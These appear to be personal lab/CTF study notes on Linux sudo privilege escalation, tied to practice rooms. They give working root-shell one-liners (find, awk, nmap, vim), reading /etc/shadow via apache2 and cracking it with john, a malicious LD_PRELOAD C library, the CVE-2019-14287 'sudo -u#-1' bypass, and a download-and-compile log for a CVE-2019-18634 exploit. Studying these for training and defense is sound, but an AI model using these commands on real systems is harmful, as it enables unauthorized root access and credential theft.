#Linux #PrivEsc #sudo #GTFOBins #Find #AWK #nmap #vim #LD_PRELOAD  #gcc #C #john #Apache #hashcat #/etc/shadow #wget #CVE-2019-14287 #CVE-2019-18634 #BufferOverflow 


# **Sudo Shell Escaping**
#sudo #GTFOBins #Find #AWK #nmap #vim

[GTFOBins](https://gtfobins.github.io/)

[Linux PrivEsc Playground](https://tryhackme.com/room/privescplayground)

- Example if we can run `find` as `sudo`: `sudo find . -exec /bin/sh \; -quit`
- This gets us a root shell

## **Detection**﻿
Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via `sudo`.

## **Exploitation**
Linux VM

1. In command prompt type any of the following:
	a. `sudo find /bin -name nano -exec /bin/sh \;`
	b. `sudo awk 'BEGIN {system("/bin/sh")}'`
	c. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
	d. `sudo vim -c '!sh'`

---

# **Intended Functionality**
#sudo #john #Apache #hashcat #/etc/shadow #wget 

More [examples](https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/)

## **Detection**
Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via `sudo`.

## **Exploitation**
Linux VM

1. In command prompt type: `sudo apache2 -f /etc/shadow`
2. From the output, copy the root hash.

Attacker VM  

1. Open command prompt and type: `echo '[Pasted Root Hash]' > hash.txt`
2. In command prompt type: `john --wordlist=/usr/share/wordlists/nmap.lst hash.txt`
3. From the output, notice the cracked credentials.

---

# **LD_PRELOAD**
#LD_PRELOAD #sudo #gcc #C
## **Detection**
Linux VM

1. In command prompt type: `sudo -l`
2. From the output, notice that the `LD_PRELOAD` environment variable is intact.

## **Exploitation**

1. Open a text editor and type:

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>


void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");

}
```

2. Save the file as `x.c`
3. In command prompt type: `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles  -static`
	- *Note: must use tabs not spaces in C code*
4. In command prompt type: `sudo LD_PRELOAD=/tmp/x.so apache2`
5. In command prompt type: `id`

---

# CTF Challenge

[[EasyCTF - THM]]

- The box was easy however, it was unstable.

[dirsearch](https://github.com/maurosoria/dirsearch)

[Exploit-DB for Simple CMS](https://www.exploit-db.com/exploits/46635)


---

# CVE-2019-14287
#CVE-2019-14287 #sudo 

[Exploit-DB for CVE-2019-14287](https://www.exploit-db.com/exploits/47502)

#CVE-2019-14287 is a vulnerability found in the Unix #Sudo program. This exploit has since been fixed, but may still be present in older versions of **Sudo (versions < 1.8.28)**, so it's well worth keeping an eye out for!

For example, sudo would usually be used like so: `sudo <command>`, but you could manually choose to execute it as another user like this: `sudo -u#<id> <command>`. This means that you would be pretending to be another user when you executed the chosen command, which can give you higher permissions than you might otherwise have had. 

Like many commands on Unix systems, sudo can be configured by editing a configuration file on your system. In this case that file is called `/etc/sudoers`. Editing this file directly is not recommended due to its importance to the OS installation, however, you can safely edit it with the command `sudo visudo`, which checks when you're saving to ensure that there are no misconfigurations.  

The vulnerability we're interested in for this task occurs in a very particular scenario. Say you have a user who you want to grant extra permissions to. You want to let this user execute a program as if they were any other user, but you _don't_ want to let them execute it as root. You might add this line to the sudoers file:

`<user> ALL=(ALL:!root) NOPASSWD: ALL`

This would let your user execute any command as another user, but would (theoretically) prevent them from executing the command as the superuser/admin/root. In other words, you can pretend to be any user, except from the admin.  

Theoretically.

In practice, with vulnerable versions of Sudo you can get around this restriction to execute the programs as root anyway, which is obviously great for privilege escalation!

With the above configuration, using `sudo -u#0 <command>` (the UID of root is always 0) would not work, as we're not allowed to execute commands as root. If we try to execute commands as user 0 we will be given an error. Enter #CVE-2019-14287.

If you specify a UID of -1 (or its unsigned equivalent: 4294967295), Sudo would incorrectly read this as being 0 (i.e. root). This means that by specifying a UID of -1 or 4294967295, you can execute a command as root, _despite being explicitly prevented from doing so_. It is worth noting that this will _only_ work if you've been granted non-root sudo permissions for the command.

Practically, the application of this is as follows: `sudo -u#-1 <command>`

Vulnerability for not hacking access to `/bin/bash`
- `sudo -l`
- `user (ALL, !root) /bin/bash`
Exploit with:
- `sudo -u#-1 /bin/bash`
- returns as user id 0 which is root

Practice [here](https://tryhackme.com/r/room/sudovulnsbypass)

---

# CVE-2019-18634
#CVE-2019-18634 #sudo #BufferOverflow 

[Exploit for CVE-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

#CVE-2019-18634 is slightly more technical, using a Buffer Overflow attack to get root permissions. It has been patched, but affects versions of #sudo earlier than 1.8.26. 

`sudo -V`

Let's break this down a little bit.

In the [Security Bypass room](https://tryhackme.com/room/sudovulnsbypass) I mentioned briefly that you can add things to the `/etc/sudoers` file in order to give lower-privileged users extra permissions. For this exploit we're more interested in one of the other options available: specifically an option called `pwfeedback`. This option is purely aesthetic, and is usually turned off by default (with the exception of ElementaryOS and Linux Mint - although they will likely now also stop using it). If you have used Linux before then you might have noticed that passwords typed into the terminal usually don't show any output at all; `pwfeedback` makes it so that whenever you type a character, an asterisk is displayed on the screen. Inside the `/etc/sudoers` file it is specified.

Here's the catch. When this option is turned on, it's possible to perform a #BufferOverflow [buffer overflow](https://tryhackme.com/room/bof1) attack on the sudo command. To explain it really simply, when a program accepts input from a user it stores the data in a set size of storage space. A buffer overflow attack is when you enter so much data into the input that it spills out of this storage space and into the next "box," overwriting the data in it. As far as we're concerned, this means if we fill the password box of the sudo command up with a _lot_ of garbage, we can inject our own stuff in at the end. This could mean that we get a shell as root! This exploit works regardless of whether we have any sudo permissions to begin with, unlike in CVE-2019-14287 where we had to have a very specific set of permissions in the first place.

Here's a [proof of concept](https://muirlandoracle.co.uk/wp-content/uploads/2020/02/capture-1.png)

In this command we're using the programming language Perl to generate a lot of information which we're then passing into the sudo command as a password using the pipe (`|`) operator. Notice that this doesn't actually give us root permissions -- instead it shows us an error message: `Segmentation fault`, which basically means that we've tried to access some memory that we weren't supposed to be able to access. This proves that a buffer overflow vulnerability exists: now we just need to exploit it!

This is a program written in C that exploits #CVE-2019-18634. In reality BOF attacks are considerably more complicated than in the explanation above, so we're not going to go into a huge amount of detail about what the program is doing exactly, but you can imagine that it's doing the same thing as in the explanation: filling the password field with rubbish information, then overwriting something more important that's in the next "box" with code that gives us a root shell.

This next section is interesting (and useful if you ever need to use this program for a CTF or other hacking challenge), but not essential for completing the room. This is the process that you would use if you were to download and compile the program for yourself:

1. First you download the program (in this case I used `wget` to do it in the terminal). The source code can be found on [Saleem's github](https://github.com/saleemrashid/sudo-cve-2019-18634), so if you're interested, I would highly recommend reading through the code to see what it does!
2. Next you compile the program. I've used gcc to compile the exploit: `gcc -o <output-file> <source-file>`
3. Notice that there are two files in the directory -- a blue coloured file called `exploit` which is our compiled executable, and a white coloured file called `exploit.c` which is the original source file.
4. You would then upload the file into the target machine and run it:

```
┌──(root㉿kali)-[~/Transfer]
└─# wget https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/refs/heads/master/exploit.c
--2024-10-17 16:13:47--  https://raw.githubusercontent.com/saleemrashid/sudo-cve-2019-18634/refs/heads/master/exploit.c
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.109.133, 185.199.110.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 6311 (6.2K) [text/plain]
Saving to: ‘exploit.c’

exploit.c                              100%[============================================================================>]   6.16K  --.-KB/s    in 0s      

2024-10-17 16:13:47 (23.7 MB/s) - ‘exploit.c’ saved [6311/6311]

                                                                                
┌──(root㉿kali)-[~/Transfer]
└─# gcc -o bof_sudo exploit.c 
```


Practice [here](https://tryhackme.com/r/room/sudovulnsbof)
